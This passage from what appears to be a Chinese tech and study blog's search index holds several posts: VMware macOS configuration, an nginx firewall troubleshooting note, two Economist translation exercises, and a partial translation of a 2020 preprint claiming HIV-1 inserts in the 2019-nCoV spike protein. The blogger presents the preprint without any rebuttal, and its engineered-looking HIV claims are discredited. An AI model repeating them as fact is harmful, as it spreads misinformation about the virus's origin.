&quot;hub&quot;</span><br><span class="line">usb:1.port = &quot;1&quot;</span><br><span class="line">usb:1.parent = &quot;-1&quot;</span><br><span class="line">toolsInstallManager.updateCounter = &quot;17&quot;</span><br><span class="line">ethernet0.displayName = &quot;VMnet8 (NAT&quot;</span><br><span class="line">ethernet0.linkStatePropagation.enable = &quot;TRUE&quot;</span><br><span class="line">tools.remindInstall = &quot;FALSE&quot;</span><br><span class="line">gui.lastPoweredViewMode = &quot;fullscreen&quot;</span><br><span class="line">svga.maxWidth = &quot;1920&quot;</span><br><span class="line">svga.maxHeight = &quot;1080&quot;</span><br><span class="line">svga.autodetect = &quot;FALSE&quot;</span><br><span class="line">mks.enable3d = &quot;TRUE&quot;</span><br><span class="line">gui.stretchGuestMode = &quot;fullfill&quot;</span><br><span class="line">isolation.tools.hgfs.disable = &quot;FALSE&quot;</span><br><span class="line">sharedFolder0.present = &quot;TRUE&quot;</span><br><span class="line">sharedFolder0.enabled = &quot;TRUE&quot;</span><br><span class="line">sharedFolder0.readAccess = &quot;TRUE&quot;</span><br><span class="line">sharedFolder0.writeAccess = &quot;TRUE&quot;</span><br><span class="line">sharedFolder0.hostPath = &quot;E:\迅雷下载&quot;</span><br><span class="line">sharedFolder0.guestName = &quot;迅雷下载&quot;</span><br><span class="line">sharedFolder0.expiration = &quot;never&quot;</span><br><span class="line">sharedFolder.maxNum = &quot;1&quot;</span><br><span class="line">toolsInstallManager.lastInstallError = &quot;21004&quot;</span><br><span class="line">cpuid.coresPerSocket = &quot;2&quot;</span><br><span class="line">usb_xhci:4.present = &quot;TRUE&quot;</span><br><span class="line">usb_xhci:4.deviceType = &quot;hid&quot;</span><br><span class="line">usb_xhci:4.port = &quot;4&quot;</span><br><span class="line">usb_xhci:4.parent = &quot;-1&quot;</span><br></pre></td></tr></table></figure>

</p>
</details>

<h3 id="重启机器生效"><a href="#重启机器生效" class="headerlink" title="重启机器生效"></a>重启机器生效</h3><p>重启机器之后，我们就可以正常登录iCloud和App Store了。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.youtube.com/watch?v=S7UFEpbEYFM">youtube视频：解锁AppStore</a><br><a href="https://mackie100projects.altervista.org/download-clover-configurator/">CloverConfigure下载链接</a><br><a href="https://hwaddress.com/mac-address-range">随机MAC地址大全</a><br><a href="https://discussionschinese.apple.com/thread/140105623">“此apple id尚未在app store使用”的官方Q&amp;A</a></p>
]]></content>
      <categories>
        <category>问题解决</category>
        <category>黑苹果</category>
      </categories>
      <tags>
        <tag>vmware黑苹果</tag>
        <tag>登不上appleid</tag>
        <tag>iCloud</tag>
        <tag>App Store</tag>
      </tags>
  </entry>
  <entry>
    <title>防火墙导致nginx监听端口访问不通</title>
    <url>//posts/ZH-CN/Nginx_Port_Block.html</url>
    <content><![CDATA[<h2 id="问题现象"><a href="#问题现象" class="headerlink" title="问题现象"></a>问题现象</h2><p>部署完nginx+keepalived（一主一备模式）高可用架构之后，发现外部无法通过虚IP访问nginx代理的业务。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="排查步骤"><a href="#排查步骤" class="headerlink" title="排查步骤"></a>排查步骤</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 首先检查在主机是否能正常访问监听端口：结果是telnet主机自身IP+监听端口，能正常访问</span><br><span class="line">2. 在外部telnet虚IP的监听端口：结果是telnet不通，可能是网络环境问题</span><br><span class="line">3. 在备机telnet虚IP的监听端口：结果是telnet不通，排除网络环境因素，可能是虚IP绑定有问题</span><br><span class="line">4. 排除虚IP绑定失败的因素，在备机telnet主机IP的监听端口：结果是telnet不通，说明主机和备机之间的网络存在问题</span><br><span class="line">5. 在备机telnet主机IP的ssh端口：结果是telnet通了，怀疑是防火墙做了设置</span><br><span class="line">6. 检查主机的防火墙状态：发现防火墙处于开启状态</span><br><span class="line">7. 关闭主机防火墙，在备机telnet测试端口连通性：结果是监听端口均能正常访问，说明问题根源是防火墙阻断了网络导致无法从外部访问nginx监听端口</span><br><span class="line">8. 检查备机，发现备机的防火墙处于开启状态，同样，需要关闭备机的防火墙</span><br></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以后遇到网络上无法访问nginx监听端口的情况，在确认机器自身可以访问监听端口之后，首先要检查防火墙状态以及防火墙策略。</p>
]]></content>
      <categories>
        <category>nginx</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>防火墙</tag>
        <tag>nginx监听端口访问不通</tag>
      </tags>
  </entry>
  <entry>
    <title>零工经济为什么还没开始盈利</title>
    <url>//posts/ZH-CN/Espresso-Economics-Marathon-88day.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>经济学人浓咖啡马拉松计划doing！第-88天。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="喝吧"><a href="#喝吧" class="headerlink" title="喝吧"></a>喝吧</h2><p>Good news, bad news: the gig economy</p>
<p>好消息，坏消息：零工经济</p>
<p><img src="https://v2ray.dana5haw.com:8008/images/2021/11/11/fikri-rasyid-HGLCvGWujGE-unsplash.jpg" alt="fikri-rasyid-HGLCvGWujGE-unsplash.jpg"></p>
<p>Last Thursday Uber, a ride-sharing app, said that it is at last profitable, at least by one metric.</p>
<p>上周四拼车应用Uber声称，它最终至少有一个指标是盈利的。</p>
<p>DoorDash, a delivery firm, was expected to suffer when it reported earnings on Tuesday.</p>
<p>周二，快递公司DoorDash发布了盈利报告，预计接下来会很难熬。</p>
<p>Instead revenue in the latest quarter held up at nearly $1.3bn, although net losses more than doubled to $101m compared with the same period a year ago.</p>
<p>和去年同时期相比，尽管上季度的收入上涨至将近13亿美元，但是其净亏损翻了一番，达到1.01亿美元。</p>
<p>Gig-economy firms have seen more than $100bn in investment, but recent successes do not mean the sector has turned a corner.</p>
<p>零工经济公司的投资额超过了1000亿美元，但这并不意味着零工经济已经柳暗花明。</p>
<p>According to The Economist’s calculations, the nine ride-sharing and delivery firms that have gone public so far—Uber and Lyft, two American ride-sharing firms, and Didi, their Chinese counterpart, as well as six delivery firms, from America, Britain, China, Germany and India—grew on average by 103% in their latest reporting period compared with the same period of the previous year.</p>
<p>根据经济学人统计结果，最新报告显示，和往年同时期相比，目前9家已上市的拼车公司和快递公司—2家美国拼车公司Uber、Lyft以及他们的中国竞争对手滴滴，和另外6家来自美国、英国、中国、德国和印度的快递公司，他们的平均收入增长了103%。</p>
<p><img src="https://v2ray.dana5haw.com:8008/images/2021/11/11/joshua-lawrence-_3KdzprXR3Y-unsplash.jpg" alt="joshua-lawrence-_3KdzprXR3Y-unsplash.jpg"></p>
<p>But they were still not profitable.</p>
<p>但他们仍然还没开始盈利。</p>
<p>Sales for the group have amounted to $75bn over the past twelve months and the operating loss to nearly $11.5bn.</p>
<p>在过去12个月以来，这些公司的销售总额达到了750亿美元，而经营亏损将近115亿美元。</p>
<p>拼车、快递都是和日常生活息息相关的业务，就算这些公司还没盈利，破产的可能性也很小。因为人们已经对这些服务产生了强烈依赖。</p>
]]></content>
      <categories>
        <category>经济学人</category>
      </categories>
      <tags>
        <tag>I期马拉松</tag>
        <tag>经济学人</tag>
        <tag>浓咖啡</tag>
      </tags>
  </entry>
  <entry>
    <title>隐形钢：超硬木材的前景</title>
    <url>//posts/ZH-CN/Espresso-Economics-Marathon-90day.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>经济学人浓咖啡马拉松计划doing！第-90天。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="喝吧"><a href="#喝吧" class="headerlink" title="喝吧"></a>喝吧</h2><p>Hidden steel: the promise of ultra-hard wood</p>
<p>隐形钢：超硬木材的前景</p>
<p><img src="https://v2ray.dana5haw.com:8008/images/2021/11/11/joyce-o-LDj4Vu3P348-unsplash.jpg" alt="joyce-o-LDj4Vu3P348-unsplash.jpg"></p>
<p>Wooden tools were eclipsed by harder and more durable metal implements long ago.</p>
<p>长期以来，和硬度和耐用性都更强的金属器具相比，木制工具黯然失色。</p>
<p>But metals are not renewable; scientists are on the hunt for something that is.</p>
<p>但金属是不可再生的，科学家们正在寻找可再生的替代材料。</p>
<p>Teng Li, a researcher at the University of Maryland, wondered whether wood could be made strong enough to provide the solution.</p>
<p>马里兰大学的研究学者李腾探究的方案是，使用足够硬的木材作为替代品。</p>
<p>His recent report in Matter suggests that it can.</p>
<p>他近期发表于Matter的报告说明了该方案的可行性。</p>
<p>Mr Li used chemicals to remove a portion of wood’s structural compounds and compacted the remaining components, before heating, drying and oiling the residue.</p>
<p>首先使用化学物质脱去木材的部分结构化合物（木质素），然后压缩残留物，再对其进行加热、干燥和油处理。</p>
<p>（图源：科学网）</p>
<p><img src="https://v2ray.dana5haw.com:8008/images/2021/11/11/hardwood.png" alt="hardwood.png"></p>
<p>The end result was a material twice as hard as aluminium and nearly as hard as copper.</p>
<p>最终得到的材料硬度是铝的2倍，几乎接近铜的硬度。</p>
<p>It can be honed: when examined under a microscope, knives made from the treated timber were three times sharper than those made from steel.</p>
<p>可打磨：在显微镜下观察到，使用这种处理过的木材制作的刀具比钢刀还要锋利3倍。</p>
<p>Given that such blades are light, renewable and rustproof, wood may well be set for a comeback.</p>
<p>因为刀片质地轻、可再生、防锈，这种木材可能会卷土重来。</p>
<p>木头菜刀切到木头菜板上是什么质感？本是同根生，相煎何太急。</p>
]]></content>
      <categories>
        <category>经济学人</category>
      </categories>
      <tags>
        <tag>I期马拉松</tag>
        <tag>经济学人</tag>
        <tag>浓咖啡</tag>
      </tags>
  </entry>
  <entry>
    <title>2019-nCov病毒</title>
    <url>//posts/ZH-CN/2019-nCov.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>鉴于对2019-nCov病毒的关注，最近得知印度科学家发表了一篇论文，论证该病毒被插入了HIV病毒的氨基酸序列，新闻报导很多。为了辨别这些新闻的真伪，在网上找了论文原版，自己尝试着翻译一下。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><blockquote>
<p><strong>Uncanny similarity of unique inserts in the 2019-nCoV spike protein to HIV-1 gp120 and Gag</strong></p>
</blockquote>
<p><strong>2019新型冠状病毒棘突蛋白的特殊插入序列和HIV-1 gp120基因、Gag基因有神秘的相似性</strong></p>
<blockquote>
<p>Abstract:<br>We are currently witnessing a major epidemic caused by the 2019 novel coronavirus (2019-nCoV). The evolution of 2019-nCoV remains elusive. We found 4 insertions in the spike glycoprotein (S) which are unique to the 2019-nCoV and are not present in other coronaviruses. Importantly, amino acid residues in all the 4 inserts have identity or similarity to those in the HIV-1 gp120 or HIV-1 Gag. Interestingly, despite the inserts being discontinuous on the primary amino acid sequence, 3D-modelling of the 2019-nCoV suggests that they converge to constitute the receptor binding site. The finding of 4 unique inserts in the 2019-nCoV, all of which have identity /similarity to amino acid residues in key structural proteins of HIV-1 is unlikely to be fortuitous in nature. This work provides yet unknown insights on 2019-nCoV and sheds light on the evolution and pathogenicity of this virus with important implications for diagnosis of this virus.</p>
</blockquote>
<p>摘要：<br>我们目前正在见证着2019新型冠状病毒导致的一场严重疫情。病毒的进化仍然难以捉摸。我们发现这个病毒的棘突糖蛋白（S蛋白）有4个特殊的插入序列，其他的冠状病毒也没有这样的插入序列。重点是，这4个序列的氨基酸残基具有HIV-1 gp120基因、HIV-1 Gag基因的特征。有趣的是，尽管这些插入序列在一级氨基酸序列上是不连续的，2019-nCov的3D模型却显示，它们汇聚并构成了受体结合部位。2019-nCov的4个特殊插入序列具有和HIV-1主要结构蛋白相似的氨基酸残基这一发现，不可能是自然界偶发的。本论文提供了2019-nCov的未知见解，阐明这个病毒的进化和致病性，对分析病毒有重大意义。</p>
<blockquote>
<p>Introduction<br>Coronaviruses (CoV) are single-stranded positive-sense RNA viruses that infect animals and humans. These are classified into 4 genera based on their host specificity: Alphacoronavirus, Betacoronavirus, Deltacoronavirus and Gammacoronavirus (Snijder et al., 2006). There are seven known types of CoVs that includes 229E and NL63 (Genus Alphacoronavirus), OC43, HKU1, MERS and SARS (Genus Betacoronavirus). While 229E, NL63, OC43, and HKU1 commonly infect humans, the SARS and MERS outbreak in 2002 and 2012 respectively occurred when the virus crossed-over from animals to humans causing significant mortality (J. Chan et al., n.d.; J. F. W. Chan et al., 2015). In December 2019, another outbreak of coronavirus was reported from Wuhan, China that also transmitted from animals to humans. This new virus has been temporarily termed as 2019-novel Coronavirus (2019-nCoV) by the World Health Organization (WHO) (J. F.- W. Chan et al., 2020; Zhu et al., 2020). While there are several hypotheses about the origin of 2019-nCoV, the source of this ongoing outbreak remains elusive. </p>
</blockquote>
<p>介绍<br>冠状病毒（CoV）是单链正义RNA病毒，会感染动物和人类。基于宿主专一性，分为4类：α冠状病毒、β冠状病毒、Δ冠状病毒、γ冠状病毒。已知的7类冠状病毒包括：229E和NL63（α冠状病毒属）、OC43、HKU1、MERS和SARS（β冠状病毒属）。229E、NL63、OC43、HKU1通常感染人类，2002年和2012年分别爆发的SARS和MERS由动物传播到人类，造成巨大死亡。2019年12月，中国武汉报导的一起冠状病毒爆发，也是由动物传播到人类。这种新型病毒由世卫组织（WHO）暂命名为2019新型冠状病毒。尽管关于2019-nCov的来源有几种假设，这个病毒的起源仍然难以捉摸。</p>
<blockquote>
<p>The transmission patterns of 2019-nCoV is similar to patterns of transmission documented in the previous outbreaks including by bodily or aerosol contact with persons infected with the virus. Cases of mild to severe illness, and death from the infection have been reported from Wuhan. This outbreak has spread rapidly distant nations including France, Australia and USA among others. The number of cases within and outside China are increasing steeply. Our current understanding is limited to the virus genome sequences and modest epidemiological and clinical data. Comprehensive analysis of the available 2019- nCoV sequences may provide important clues that may help advance our current understanding to manage the ongoing outbreak.<br>The spike glycoprotein (S) of cornonavirus is cleaved into two subunits (S1 and S2). The S1 subunit helps in receptor binding and the S2 subunit facilitates membrane fusion (Bosch et al., 2003; Li, 2016). The spike glycoproteins of coronoviruses are important determinants of tissue tropism and host range. In addition the spike glycoproteins are critical targets for vaccine development (Du et al., 2013). For this reason, the spike proteins represent the most extensively studied among coronaviruses. We therefore sought to investigate the spike glycoprotein of the 2019-nCoV to understand its evolution, novel features sequence and structural features using computational tools. </p>
</blockquote>
<p>2019-nCov的传播模式类似于以往爆发的记录在案的病毒，通过身体、空气接触传播病毒。</p>
<blockquote>
<p>Methodology<br>Retrieval and alignment of nucleic acid and protein sequences<br>We retrieved all the available coronavirus sequences (n=55) from NCBI viral genome database<br>(<a href="https://www.ncbi.nlm.nih.gov/">https://www.ncbi.nlm.nih.gov/</a>) and we used the GISAID (Elbe &amp; Buckland-Merrett,<br>2017)[<a href="https://www.gisaid.org/]">https://www.gisaid.org/]</a> to retrieve all available full-length sequences (n=28) of 2019-<br>nCoV as on 27 Jan 2020. Multiple sequence alignment of all coronavirus genomes was performed<br>by using MUSCLE software (Edgar, 2004) based on neighbour joining method. Out of 55<br>coronavirus genome 32 representative genomes of all category were used for phylogenetic tree<br>development using MEGAX software (Kumar et al., 2018). The closest relative was found to be<br>SARS CoV. The glycoprotein region of SARS CoV and 2019-nCoV were aligned and visualized<br>using Multalin software (Corpet, 1988). The identified amino acid and nucleotide sequence were<br>aligned with whole viral genome database using BLASTp and BLASTn. The conservation of the<br>nucleotide and amino acid motifs in 28 clinical variants of 2019-nCoV genome were presented by<br>performing multiple sequence alignment using MEGAX software. The three dimensional structure<br>of 2019-nCoV glycoprotein was generated by using SWISS-MODEL online server (Biasini et al.,<br>2014) and the structure was marked and visualized by using PyMol (DeLano, 2002).<br>Results<br>Uncanny similarity of novel inserts in the 2019-nCoV spike protein to HIV-1 gp120 and<br>Gag<br>Our phylogentic tree of full-length coronaviruses suggests that 2019-nCoV is closely related to<br>SARS CoV [Fig1]. In addition, other recent studies have linked the 2019-nCoV to SARS CoV.<br>We therefore compared the spike glycoprotein sequences of the 2019-nCoV to that of the SARS<br>CoV (NCBI Accession number: AY390556.1). On careful examination of the sequence<br>alignment we found that the 2019- nCoV spike glycoprotein contains 4 insertions [Fig.2]. To<br>further investigate if these inserts are present in any other corona virus, we performed a multiple sequence alignment of the spike glycoprotein amino acid sequences of all available<br>coronaviruses (n=55) [refer Table S.File1] in NCBI refseq (ncbi.nlm.nih.gov) this includes one<br>sequence of 2019-nCoV[Fig.S1]. We found that these 4 insertions [inserts 1, 2, 3 and 4] are<br>unique to 2019-nCoV and are not present in other coronaviruses analyzed. Another group from<br>China had documented three insertions comparing fewer spike glycoprotein sequences of<br>coronaviruses . Another group from China had documented three insertions comparing fewer<br>spike glycoprotein sequences of coronaviruses (Zhou et al., 2020).<br>Figure 1: Maximum likelihood genealogy show the evolution of 2019- nCoV: The evolutionary history<br>was inferred by using the Maximum Likelihood method and JTT matrix-based model. The tree<br>with the highest log likelihood (12458.88) is shown. Initial tree(s) for the heuristic search were<br>obtained automatically by applying Neighbor-Join and BioNJ algorithms to a matrix of pairwise<br>distances estimated using a JTT model, and then selecting the topology with superior log likelihood value. This analysis involved 5 amino acid sequences. There were a total of 1387 positions in the<br>final dataset. Evolutionary analyses were conducted in MEGA X.<br>Figure 2: Multiple sequence alignment between spike proteins of 2019-nCoV and SARS. The<br>sequences of spike proteins of 2019-nCoV (Wuhan-HU-1, Accession NC_045512) and of SARS<br>CoV (GZ02, Accession AY390556) were aligned using MultiAlin software. The sites of difference<br>are highlighted in boxes.<br>We then analyzed all available full-length sequences (n=28) of 2019-nCoV in GISAID (Elbe &amp;<br>Buckland-Merrett, 2017) as on January 27, 2020 for the presence of these inserts. As most of these<br>sequences are not annotated, we compared the nucleotide sequences of the spike glycoprotein of<br>all available 2019-nCoV sequences using BLASTp. Interestingly, all the 4 insertions were<br>absolutely (100%) conserved in all the available 2019- nCoV sequences analyzed [Fig.S2, Fig.S3].<br>We then translated the aligned genome and found that these inserts are present in all Wuhan 2019-<br>nCoV viruses except the 2019-nCoV virus of Bat as a host [Fig.S4]. Intrigued by the 4 highly<br>conserved inserts unique to 2019-nCoV we wanted to understand their origin. For this purpose,<br>we used the 2019-nCoV local alignment with each insert as query against all virus genomes and<br>considered hits with 100% sequence coverage. Surprisingly, each of the four inserts aligned with<br>short segments of the Human immunodeficiency Virus-1 (HIV-1) proteins. The amino acid<br>positions of the inserts in 2019-nCoV and the corresponding residues in HIV-1 gp120 and HIV-1<br>Gag are shown in Table 1. The first 3 inserts (insert 1,2 and 3) aligned to short segments of amino<br>acid residues in HIV-1 gp120. The insert 4 aligned to HIV-1 Gag. The insert 1 (6 amino acid<br>residues) and insert 2 (6 amino acid residues) in the spike glycoprotein of 2019-nCoV are 100%<br>identical to the residues mapped to HIV-1 gp120. The insert 3 (12 amino acid residues) in 2019-<br>nCoV maps to HIV-1 gp120 with gaps [see Table 1]. The insert 4 (8 amino acid residues) maps to<br>HIV-1 Gag with gaps.<br>Although, the 4 inserts represent discontiguous short stretches of amino acids in spike glycoprotein<br>of 2019-nCoV, the fact that all three of them share amino acid identity or similarity with HIV-1<br>gp120 and HIV-1 Gag (among all annotated virus proteins) suggests that this is not a random<br>fortuitous finding. In other words, one may sporadically expect a fortuitous match for a stretch of<br>6-12 contiguous amino acid residues in an unrelated protein. However, it is unlikely that all 4<br>inserts in the 2019-nCoV spike glycoprotein fortuitously match with 2 key structural proteins of<br>an unrelated virus (HIV-1).<br>The amino acid residues of inserts 1, 2 and 3 of 2019-nCoV spike glycoprotein that mapped to<br>HIV-1 were a part of the V4, V5 and V1 domains respectively in gp120 [Table 1]. Since the 2019-<br>nCoV inserts mapped to variable regions of HIV-1, they were not ubiquitous in HIV-1 gp120, but<br>were limited to selected sequences of HIV-1 [ refer S.File1] primarily from Asia and Africa.<br>The HIV-1 Gag protein enables interaction of virus with negatively charged host surface<br>(Murakami, 2008) and a high positive charge on the Gag protein is a key feature for the host-virus<br>interaction. On analyzing the pI values for each of the 4 inserts in 2019-nCoV and the<br>corresponding stretches of amino acid residues from HIV-1 proteins we found that a) the pI values<br>were very similar for each pair analyzed b) most of these pI values were 10±2 [Refer Table 1] . Of<br>note, despite the gaps in inserts 3 and 4 the pI values were comparable. This uniformity in the pI<br>values for all the 4 inserts merits further investigation.<br>As none of these 4 inserts are present in any other coronavirus, the genomic region encoding these<br>inserts represent ideal candidates for designing primers that can distinguish 2019-nCoV from other<br>coronaviruses.<br>Table 1: Aligned sequences of 2019-nCoV and gp120 protein of HIV-1 with their positions<br>in primary sequence of protein. All the inserts have a high density of positively charged<br>residues. The deleted fragments in insert 3 and 4 increase the positive charge to surface area<br>ratio. *please see Supp. Table 1 for accession numbers<br>The novel inserts are part of the receptor binding site of 2019-nCoV<br>To get structural insights and to understand the role of these insertions in 2019-nCoV glycoprotein,<br>we modelled its structure based on available structure of SARS spike glycoprotein (PDB:<br>6ACD.1.A). The comparison of the modelled structure reveals that although inserts 1,2 and 3 are<br>at non-contiguous locations in the protein primary sequence, they fold to constitute the part of<br>glycoprotein binding site that recognizes the host receptor (Kirchdoerfer et al., 2016) (Figure 4).<br>The insert 1 corresponds to the NTD (N-terminal domain) and the inserts 2 and 3 correspond to<br>the CTD (C-terminal domain) of the S1 subunit in the 2019-nCoV spike glycoprotein. The insert<br>4 is at the junction of the SD1 (sub domain 1) and SD2 (sub domain 2) of the S1 subunit (Ou et<br>al., 2017). We speculate, that these insertions provide additional flexibility to the glycoprotein<br>binding site by forming a hydrophilic loop in the protein structure that may facilitate or enhance<br>virus-host interactions.<br>Figure 3. Modelled homo-trimer spike glycoprotein of 2019-nCoV virus. The inserts from HIV<br>envelop protein are shown with colored beads, present at the binding site of the protein.<br>Evolutionary Analysis of 2019-nCoV<br>It has been speculated that 2019-nCoV is a variant of Coronavirus derived from an animal source<br>which got transmitted to humans. Considering the change of specificity for host, we decided to<br>study the sequences of spike glycoprotein (S protein) of the virus. S proteins are surface proteins<br>that help the virus in host recognition and attachment. Thus, a change in these proteins can be<br>reflected as a change of host specificity of the virus. To know the alterations in S protein gene of<br>2019-nCoV and its consequences in structural re-arrangements we performed in-sillico analysis of<br>2019-nCoV with respect to all other viruses. A multiple sequence alignment between the S protein<br>amino acid sequences of 2019-nCoV, Bat-SARS-Like, SARS-GZ02 and MERS revealed that S<br>protein has evolved with closest significant diversity from the SARS-GZ02 (Figure 1).<br>Insertions in Spike protein region of 2019-nCoV<br>Since the S protein of 2019-nCoV shares closest ancestry with SARS GZ02, the sequence coding<br>for spike proteins of these two viruses were compared using MultiAlin software. We found four<br>new insertions in the protein of 2019-nCoV- “GTNGTKR” (IS1), “HKNNKS” (IS2), “GDSSSG”<br>(IS3) and “QTNSPRRA” (IS4) (Figure 2). To our surprise, these sequence insertions were not only<br>absent in S protein of SARS but were also not observed in any other member of the Coronaviridae<br>family (Supplementary figure). This is startling as it is quite unlikely for a virus to have acquired<br>such unique insertions naturally in a short duration of time.<br>Insertions share similarity to HIV<br>The insertions were observed to be present in all the genomic sequences of 2019-nCoV virus<br>available from the recent clinical isolates (Supplementary Figure 1). To know the source of these<br>insertions in 2019-nCoV a local alignment was done with BLASTp using these insertions as query<br>with all virus genome. Unexpectedly, all the insertions got aligned with Human immunodeficiency<br>Virus-1 (HIV-1). Further analysis revealed that aligned sequences of HIV-1 with 2019-nCoV were<br>derived from surface glycoprotein gp120 (amino acid sequence positions: 404-409, 462-467, 136-<br>150) and from Gag protein (366-384 amino acid) (Table 1). Gag protein of HIV is involved in host<br>membrane binding, packaging of the virus and for the formation of virus-like particles. Gp120<br>plays crucial role in recognizing the host cell by binding to the primary receptor CD4.This binding<br>induces structural rearrangements in GP120, creating a high affinity binding site for a chemokine<br>co-receptor like CXCR4 and/or CCR5.<br>Discussion<br>The current outbreak of 2019-nCoV warrants a thorough investigation and understanding of its<br>ability to infect human beings. Keeping in mind that there has been a clear change in the preference<br>of host from previous coronaviruses to this virus, we studied the change in spike protein between<br>2019-nCoV and other viruses. We found four new insertions in the S protein of 2019-nCoV when<br>compared to its nearest relative, SARS CoV. The genome sequence from the recent 28 clinical<br>isolates showed that the sequence coding for these insertions are conserved amongst all these<br>isolates. This indicates that these insertions have been preferably acquired by the 2019-nCoV,<br>providing it with additional survival and infectivity advantage. Delving deeper we found that these<br>insertions were similar to HIV-1. Our results highlight an astonishing relation between the gp120<br>and Gag protein of HIV, with 2019-nCoV spike glycoprotein. These proteins are critical for the<br>viruses to identify and latch on to their host cells and for viral assembly (Beniac et al., 2006).<br>Since surface proteins are responsible for host tropism, changes in these proteins imply a change<br>in host specificity of the virus. According to reports from China, there has been a gain of host<br>specificity in case 2019-nCoV as the virus was originally known to infect animals and not humans<br>but after the mutations, it has gained tropism to humans as well.<br>Moving ahead, 3D modelling of the protein structure displayed that these insertions are present at<br>the binding site of 2019-nCoV. Due to the presence of gp120 motifs in 2019-nCoV spike<br>glycoprotein at its binding domain, we propose that these motif insertions could have provided an<br>enhanced affinity towards host cell receptors. Further, this structural change might have also<br>increased the range of host cells that 2019-nCoV can infect. To the best of our knowledge, the<br>function of these motifs is still not clear in HIV and need to be explored. The exchange of genetic<br>material among the viruses is well known and such critical exchange highlights the risk and the<br>need to investigate the relations between seemingly unrelated virus families.<br>Conclusions<br>Our analysis of the spike glycoprotein of 2019-nCoV revealed several interesting findings: First,<br>we identified 4 unique inserts in the 2019-nCoV spike glycoprotein that are not present in any<br>other coronavirus reported till date. To our surprise, all the 4 inserts in the 2019-nCoV mapped to short segments of amino acids in the HIV-1 gp120 and Gag among all annotated virus proteins in<br>the NCBI database. This uncanny similarity of novel inserts in the 2019- nCoV spike protein to<br>HIV-1 gp120 and Gag is unlikely to be fortuitous. Further, 3D modelling suggests that atleast 3 of<br>the unique inserts which are non-contiguous in the primary protein sequence of the 2019-nCoV<br>spike glycoprotein converge to constitute the key components of the receptor binding site. Of note,<br>all the 4 inserts have pI values of around 10 that may facilitate virus-host interactions. Taken<br>together, our findings suggest unconventional evolution of 2019-nCoV that warrants further<br>investigation. Our work highlights novel evolutionary aspects of the 2019-nCoV and has<br>implications on the pathogenesis and diagnosis of this virus.<br>References<br>Beniac, D. R., Andonov, A., Grudeski, E., &amp; Booth, T. F. (2006). Architecture of the SARS coronavirus<br>prefusion spike. Nature Structural and Molecular Biology, 13(8), 751–752.<br><a href="https://doi.org/10.1038/nsmb1123">https://doi.org/10.1038/nsmb1123</a><br>Biasini, M., Bienert, S., Waterhouse, A., Arnold, K., Studer, G., Schmidt, T., Kiefer, F., Cassarino, T. G.,<br>Bertoni, M., Bordoli, L., &amp; Schwede, T. (2014). SWISS-MODEL: Modelling protein tertiary and<br>quaternary structure using evolutionary information. Nucleic Acids Research.<br><a href="https://doi.org/10.1093/nar/gku340">https://doi.org/10.1093/nar/gku340</a><br>Bosch, B. J., van der Zee, R., de Haan, C. A. M., &amp; Rottier, P. J. M. (2003). The Coronavirus Spike Protein Is<br>a Class I Virus Fusion Protein: Structural and Functional Characterization of the Fusion Core<br>Complex. Journal of Virology, 77(16), 8801–8811. <a href="https://doi.org/10.1128/jvi.77.16.8801-">https://doi.org/10.1128/jvi.77.16.8801-</a><br>8811.2003<br>Chan, J. F.-W., Kok, K.-H., Zhu, Z., Chu, H., To, K. K.-W., Yuan, S., &amp; Yuen, K.-Y. (2020). Genomic<br>characterization of the 2019 novel human-pathogenic coronavirus isolated from a patient with<br>atypical pneumonia after visiting Wuhan. Emerging Microbes &amp; Infections, 9(1), 221–236.<br><a href="https://doi.org/10.1080/22221751.2020.1719902">https://doi.org/10.1080/22221751.2020.1719902</a><br>Chan, J. F. W., Lau, S. K. P., To, K. K. W., Cheng, V. C. C., Woo, P. C. Y., &amp; Yuen, K.-Y. (2015). Middle East<br>Respiratory Syndrome Coronavirus: Another Zoonotic Betacoronavirus Causing SARS-Like Disease.<br><a href="https://doi.org/10.1128/CMR.00102-14">https://doi.org/10.1128/CMR.00102-14</a><br>Chan, J., To, K., Tse, H., Jin, D., microbiology, K. Y.-T. in, &amp; 2013, undefined. (n.d.). Interspecies<br>transmission and emergence of novel viruses: lessons from bats and birds. Elsevier.<br>Corpet, F. (1988). Multiple sequence alignment with hierarchical clustering. Nucleic Acids Research.<br><a href="https://doi.org/10.1093/nar/16.22.10881">https://doi.org/10.1093/nar/16.22.10881</a><br>DeLano, W. L. (2002). The PyMOL Molecular Graphics System, Version 1.1. Schr{ö}dinger LLC.<br><a href="https://doi.org/10.1038/hr.2014.17">https://doi.org/10.1038/hr.2014.17</a><br>Du, L., Zhao, G., Kou, Z., Ma, C., Sun, S., Poon, V. K. M., Lu, L., Wang, L., Debnath, A. K., Zheng, B.-J., Zhou,<br>Y., &amp; Jiang, S. (2013). Identification of a Receptor-Binding Domain in the S Protein of the Novel<br>Human Coronavirus Middle East Respiratory Syndrome Coronavirus as an Essential Target for<br>Vaccine Development. Journal of Virology, 87(17), 9939–9942. <a href="https://doi.org/10.1128/jvi.01048-">https://doi.org/10.1128/jvi.01048-</a><br>13<br>Edgar, R. C. (2004). MUSCLE: Multiple sequence alignment with high accuracy and high throughput.<br>Nucleic Acids Research. <a href="https://doi.org/10.1093/nar/gkh340">https://doi.org/10.1093/nar/gkh340</a><br>Elbe, S., &amp; Buckland-Merrett, G. (2017). Data, disease and diplomacy: GISAID’s innovative contribution<br>to global health. Global Challenges. <a href="https://doi.org/10.1002/gch2.1018">https://doi.org/10.1002/gch2.1018</a><br>Kirchdoerfer, R. N., Cottrell, C. A., Wang, N., Pallesen, J., Yassine, H. M., Turner, H. L., Corbett, K. S.,<br>Graham, B. S., McLellan, J. S., &amp; Ward, A. B. (2016). Pre-fusion structure of a human coronavirus<br>spike protein. Nature. <a 